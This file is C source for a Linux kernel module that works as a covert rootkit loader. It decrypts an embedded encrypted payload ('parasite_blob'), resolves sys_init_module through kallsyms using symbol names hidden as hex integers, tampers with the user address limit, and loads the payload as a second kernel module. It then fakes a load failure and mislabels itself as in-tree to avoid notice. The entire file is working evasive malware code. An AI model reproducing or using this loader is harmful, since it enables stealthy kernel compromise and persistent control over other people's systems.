#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/uaccess.h>

#ifndef user_addr_max
#define user_addr_max() (current_thread_info()->addr_limit.seg)
#endif

#include "encrypt.h"

#define SYS_INIT_MODULE                                 \
	({                                              \
		unsigned int *p = __builtin_alloca(16); \
		p[0] = 0x5f737973;                      \
		p[1] = 0x74696e69;                      \
		p[2] = 0x646f6d5f;                      \
		p[3] = 0x00656c75;                      \
		(char *)p;                              \
	})

#define __DO_SYS_INIT_MODULE                            \
	({                                              \
		unsigned int *p = __builtin_alloca(24); \
		p[0] = 0x6f645f5f;                      \
		p[1] = 0x7379735f;                      \
		p[2] = 0x696e695f;                      \
		p[3] = 0x6f6d5f74;                      \
		p[4] = 0x656c7564;                      \
		p[5] = 0x00000000;                      \
		(char *)p;                              \
	})

static char parasite_blob[] = {
#include "parasite_blob.inc"
};

static int ksym_lookup_cb(unsigned long data[], const char *name, void *module,
			  unsigned long addr)
{
	int i = 0;
	while (!module && (((const char *)data[0]))[i] == name[i]) {
		if (!name[i++])
			return !!(data[1] = addr);
	}
	return 0;
}

static unsigned long vtest_lookup_name(const char *name)
{
    unsigned int i = 0, first_space_idx = 0, second_space_idx = 0; /* Read Index and indexes of spaces */
    struct file *proc_ksyms = NULL;
    loff_t pos = 0;
    unsigned long ret = 0;
    ssize_t read = 0;
    int err = 0;
    const size_t name_len = strlen(name);

    /*
     * Buffer for each line of kallsyms file.
     * Linux defines KSYM_NAME_LEN to 512 since 6.1, with a rational documented in commit
     * https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/include/linux/kallsyms.h?id=b8a94bfb33952bb17fbc65f8903d242a721c533d
     */
    char proc_ksyms_entry[512] = {0};

    proc_ksyms = filp_open("/proc/kallsyms", O_RDONLY, 0);
    if (proc_ksyms == NULL)
        goto cleanup;

    read = kernel_read(proc_ksyms, proc_ksyms_entry + i, 1, &pos);
    while (read == 1) {
        if (proc_ksyms_entry[i] == '\n' || (size_t)i == sizeof(proc_ksyms_entry) - 1) {
            /* Prefix-match the name with the 3rd field of the line, after the second space */
            if (second_space_idx > 0 &&
                second_space_idx + 1 + name_len <= sizeof(proc_ksyms_entry) &&
                !strncmp(proc_ksyms_entry + second_space_idx + 1, name, name_len)) {
                printk(KERN_INFO "[+] %s: %.*s\n", name,
                        i, proc_ksyms_entry);
                /* Decode the address, which is in hexadecimal */
                proc_ksyms_entry[first_space_idx] = '\0';
                err = kstrtoul(proc_ksyms_entry, 16, &ret);
                if (err) {
                    printk(KERN_ERR "kstrtoul returned error %d while parsing %.*s\n",
                            err, first_space_idx, proc_ksyms_entry);
                    ret = 0;
                    goto cleanup;
                }
                goto cleanup;
            }

            i = 0;
            first_space_idx = 0;
            second_space_idx = 0;
            memset(proc_ksyms_entry, 0, sizeof(proc_ksyms_entry));
        } else {
            if (proc_ksyms_entry[i] == ' ') {
                if (first_space_idx == 0) {
                    first_space_idx = i;
                } else if (second_space_idx == 0) {
                    second_space_idx = i;
                }
            }
            i++;
        }
        read = kernel_read(proc_ksyms, proc_ksyms_entry + i, 1, &pos);
    }
    printk(KERN_ERR "symbol not found in kallsyms: %s\n", name);

cleanup:
    if (proc_ksyms != NULL)
        filp_close(proc_ksyms, 0);
    return ret;
}

static inline unsigned long ksym_lookup_name(const char *name)
{
        int (*vtest_kallsyms_on_each_symbol)(int (*fn)(void *, const char *, struct module *,
                                      unsigned long),
                            void *data) = NULL;
	unsigned long data[2] = {(unsigned long)name, 0};
        vtest_kallsyms_on_each_symbol = (void*)vtest_lookup_name("kallsyms_on_each_symbol");
        vtest_kallsyms_on_each_symbol((void *)ksym_lookup_cb, data);
	//kallsyms_on_each_symbol((void *)ksym_lookup_cb, data);
	return data[1];
}

int init_module(void)
{
	int ret = -EINVAL;
	asmlinkage long (*sys_init_module)(const void *, unsigned long, const char *) = NULL;

	do_decrypt(parasite_blob, sizeof(parasite_blob), DECRYPT_KEY);

	sys_init_module = (void *)ksym_lookup_name(SYS_INIT_MODULE);

	if (!sys_init_module)
		sys_init_module = (void *)ksym_lookup_name(__DO_SYS_INIT_MODULE);

	if (sys_init_module) {
		const char *nullarg = parasite_blob;
		unsigned long seg = user_addr_max();

		while (*nullarg)
			nullarg++;

		user_addr_max() = roundup((unsigned long)parasite_blob + sizeof(parasite_blob), PAGE_SIZE);
		if(sys_init_module(parasite_blob, sizeof(parasite_blob), nullarg) == 0) ret = -37; // would be 1337, but is too obvious. hahaha
		user_addr_max() = seg;
	}

	return ret;
}

MODULE_LICENSE("GPL");
MODULE_INFO(intree, "Y");
